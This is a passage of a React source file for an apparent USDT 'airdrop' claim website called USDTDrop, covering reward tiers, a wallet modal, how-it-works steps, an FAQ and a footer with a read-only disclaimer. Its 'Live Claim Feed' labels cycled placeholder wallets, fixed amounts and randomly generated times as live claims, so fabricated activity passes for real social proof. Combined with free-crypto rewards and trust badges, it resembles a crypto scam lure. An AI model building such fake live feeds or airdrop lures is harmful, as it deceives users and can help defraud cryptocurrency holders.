                  style={{ color: t.color }}
                >
                  {t.label}
                </p>
                <p
                  className="text-xl font-extrabold"
                  style={{ color: t.color }}
                >
                  {t.reward} USDT
                </p>
                <p className="text-xs text-white/40 mt-1">
                  ${t.minBalance}–
                  {t.maxBalance === Number.POSITIVE_INFINITY
                    ? "∞"
                    : `$${t.maxBalance}`}
                </p>
              </div>
            ))}
          </div>
        </div>
      </div>

      {modalOpen && <WalletModal onClose={() => setModalOpen(false)} />}
    </section>
  );
}

// ─── SocialProof ──────────────────────────────────────────────────────────────

interface ClaimItem {
  id: number;
  wallet: string;
  amount: number;
  timeAgo: string;
}

function makeItems(): ClaimItem[] {
  return Array.from({ length: 20 }, (_, i) => ({
    id: i,
    wallet: WALLETS[i % WALLETS.length],
    amount: AMOUNTS[i % AMOUNTS.length],
    timeAgo: `${Math.floor(Math.random() * 59) + 1}s ago`,
  }));
}

function SocialProof() {
  const [items] = useState<ClaimItem[]>(makeItems);
  const tickerRef = useRef<HTMLDivElement>(null);
  const doubled = [...items, ...items];

  return (
    <section className="py-12 px-4 overflow-hidden">
      <div className="container mx-auto max-w-5xl mb-6">
        <div className="flex items-center justify-between">
          <p className="text-xs text-white/40 uppercase tracking-widest font-medium">
            Live Claim Feed
          </p>
          <div
            className="flex items-center gap-1.5 text-xs"
            style={{ color: "#4ade80" }}
          >
            <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
            Live
          </div>
        </div>
      </div>

      <div className="relative">
        <div
          className="absolute left-0 top-0 bottom-0 w-16 z-10 pointer-events-none"
          style={{
            background: "linear-gradient(to right, #06080f, transparent)",
          }}
        />
        <div
          className="absolute right-0 top-0 bottom-0 w-16 z-10 pointer-events-none"
          style={{
            background: "linear-gradient(to left, #06080f, transparent)",
          }}
        />
        <div
          ref={tickerRef}
          className="flex gap-3 ticker-scroll"
          style={{ width: "max-content" }}
        >
          {doubled.map((item, idx) => (
            <div
              key={`${item.id}-${idx}`}
              className="flex items-center gap-3 px-4 py-2.5 rounded-xl flex-shrink-0"
              style={{
                background: "rgba(255,255,255,0.04)",
                border: "1px solid rgba(255,255,255,0.07)",
                minWidth: "220px",
              }}
            >
              <div
                className="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0"
                style={{
                  background: "linear-gradient(135deg, #7c3aed, #06b6d4)",
                  color: "white",
                }}
              >
                {item.wallet[1]}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2">
                  <span className="text-xs font-mono text-white/70 truncate">
                    {item.wallet}
                  </span>
                </div>
                <div className="text-xs text-white/40">{item.timeAgo}</div>
              </div>
              <div className="text-right flex-shrink-0">
                <div
                  className="text-sm font-bold"
                  style={{
                    color:
                      item.amount === 500
                        ? "#fbbf24"
                        : item.amount === 150
                          ? "#34d399"
                          : item.amount === 50
                            ? "#a78bfa"
                            : "#60a5fa",
                  }}
                >
                  +{item.amount} USDT
                </div>
                <div className="text-[10px] text-white/30">claimed</div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

// ─── HowItWorks ───────────────────────────────────────────────────────────────

function HowItWorks() {
  return (
    <section className="py-20 px-4">
      <div className="container mx-auto max-w-5xl">
        <div className="text-center mb-12">
          <p className="text-xs text-white/40 uppercase tracking-widest font-medium mb-3">
            Simple Process
          </p>
          <h2 className="text-2xl sm:text-3xl font-bold">
            How It <span className="gradient-text">Works</span>
          </h2>
        </div>
        <div className="grid sm:grid-cols-3 gap-6">
          {HOW_STEPS.map((step) => (
            <div
              key={step.num}
              className="glass rounded-2xl p-6 gradient-border relative overflow-hidden group hover:scale-[1.02] transition-transform duration-200"
            >
              <div
                className="absolute top-3 right-4 text-5xl font-extrabold"
                style={{ color: `${step.color}10` }}
              >
                {step.num}
              </div>
              <div
                className="w-12 h-12 rounded-xl flex items-center justify-center mb-5"
                style={{ background: step.bg, color: step.color }}
              >
                {step.icon}
              </div>
              <h3 className="font-bold text-white mb-3">{step.title}</h3>
              <p className="text-sm text-white/50 leading-relaxed">
                {step.desc}
              </p>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

// ─── FAQ ──────────────────────────────────────────────────────────────────────

function FAQ() {
  return (
    <section className="py-20 px-4">
      <div className="container mx-auto max-w-3xl">
        <div className="text-center mb-12">
          <p className="text-xs text-white/40 uppercase tracking-widest font-medium mb-3">
            Got Questions?
          </p>
          <h2 className="text-2xl sm:text-3xl font-bold">
            Frequently Asked <span className="gradient-text">Questions</span>
          </h2>
        </div>
        <div className="glass-strong rounded-2xl p-2">
          <Accordion type="single" collapsible className="space-y-1">
            {FAQS.map((faq, idx) => (
              <AccordionItem
                key={faq.q}
                value={`faq-${idx}`}
                className="rounded-xl px-1"
                style={{ border: "none" }}
                data-ocid={`faq.item.${idx + 1}`}
              >
                <AccordionTrigger className="px-4 py-4 text-sm font-medium text-white/80 hover:text-white hover:no-underline text-left">
                  {faq.q}
                </AccordionTrigger>
                <AccordionContent className="px-4 pb-4 text-sm text-white/50 leading-relaxed">
                  {faq.a}
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
        </div>
      </div>
    </section>
  );
}

// ─── Footer ───────────────────────────────────────────────────────────────────

function Footer() {
  const year = new Date().getFullYear();
  const utmLink = `https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`;

  return (
    <footer
      className="py-12 px-4"
      style={{ borderTop: "1px solid rgba(255,255,255,0.06)" }}
    >
      <div className="container mx-auto max-w-5xl">
        <div className="flex flex-col sm:flex-row items-center justify-between gap-6 mb-8">
          <div className="flex items-center gap-2">
            <div
              className="w-7 h-7 rounded-lg flex items-center justify-center"
              style={{
                background: "linear-gradient(135deg, #7c3aed 0%, #06b6d4 100%)",
              }}
            >
              <Zap className="w-3.5 h-3.5 text-white" />
            </div>
            <span className="text-white font-bold text-base tracking-tight">
              USDT<span className="gradient-text">Drop</span>
            </span>
          </div>
          <div className="flex flex-wrap items-center justify-center gap-4">
            {[
              { icon: "🔒", text: "On-chain Verified" },
              { icon: "👁", text: "Read-only" },
              { icon: "🚫", text: "No Private Keys" },
            ].map((b) => (
              <div
                key={b.text}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs"
                style={{
                  background: "rgba(255,255,255,0.04)",
                  border: "1px solid rgba(255,255,255,0.07)",
                  color: "rgba(255,255,255,0.4)",
                }}
              >
                <span>{b.icon}</span>
                <span>{b.text}</span>
              </div>
            ))}
          </div>
        </div>

        <div
          className="p-4 rounded-xl mb-8 text-xs text-white/35 leading-relaxed"
          style={{
            background: "rgba(255,255,255,0.02)",
            border: "1px solid rgba(255,255,255,0.05)",
          }}
        >
          <div className="flex items-start gap-2">
            <Shield className="w-3.5 h-3.5 mt-0.5 flex-shrink-0 text-yellow-400/60" />
            <span>
              <strong className="text-white/50">Disclaimer:</strong> This
              application only reads publicly available blockchain data. We do
              not request, store, or transmit any private keys, seed phrases, or
              wallet credentials. All balance checks are performed via the
              public Tronscan API. This is a promotional airdrop campaign for
              eligible USDT TRC20 holders. Participation is free and no
              cryptocurrency transfers are required to check eligibility.
            </span>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-white/25">
          <span>© {year} USDTDrop. All rights reserved.</span>
          <a
            href={utmLink}
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-white/50 transition-colors"
          >
            Built with ❤️ using caffeine.ai
          </a>
        </div>
      </div>
    </footer>
  );
}

// ─── App ──────────────────────────────────────────────────────────────────────

function App() {
  return (
    <div className="min-h-screen font-sans">
      <Toaster
        theme="dark"
        toastOptions={{
          style: {
            background: "rgba(255,255,255,0.07)",
            backdropFilter: "blur(20px)",
            border: "1px solid rgba(255,255,255,0.1)",
            color: "white",
          },
        }}
      />
      <Navbar />
      <main>
        <HeroSection />
        <AirdropClaim />
        <SocialProof />
        <HowItWorks />
        <FAQ />
      </main>
      <Footer />
    </div>
  );
}

export default App;
